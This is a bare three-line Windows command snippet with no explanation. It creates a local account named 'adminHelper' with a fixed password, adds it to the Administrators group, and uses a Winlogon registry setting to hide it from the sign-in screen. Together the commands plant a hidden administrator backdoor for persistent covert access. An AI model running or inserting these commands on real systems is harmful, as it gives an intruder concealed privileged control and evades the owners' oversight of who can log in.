net user adminHelper P@ssw0rd123! /add
net localgroup Administrators adminHelper /add
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v adminHelper /t REG_DWORD /d 0 /f